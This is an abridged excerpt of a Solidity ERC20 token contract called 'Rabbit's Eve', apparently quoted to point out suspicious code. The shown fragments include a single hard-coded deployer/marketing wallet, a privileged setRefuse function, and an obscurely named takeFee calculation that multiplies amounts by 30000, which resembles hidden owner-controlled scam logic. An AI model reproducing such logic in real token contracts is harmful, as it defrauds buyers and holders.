...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    string private _name = "Rabbit's Eve";
    ...
    constructor () {
        ...
        deployer = payable(address(0xbDc73aeDD32f851d0Adf9A2B5B16A314dc787812));
        ...
        marketing = payable(address(0xbDc73aeDD32f851d0Adf9A2B5B16A314dc787812));
    ...
    function setRefuse(address poor) external {
        require(isTxLimitExempt[msg.sender]);
        isExcludedFromFee[poor] = false;
    }
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        uint256 mold = excape;
        uint256 feeAmount = 0;
        uint256 feeExcape = excape.add(mold*30000);
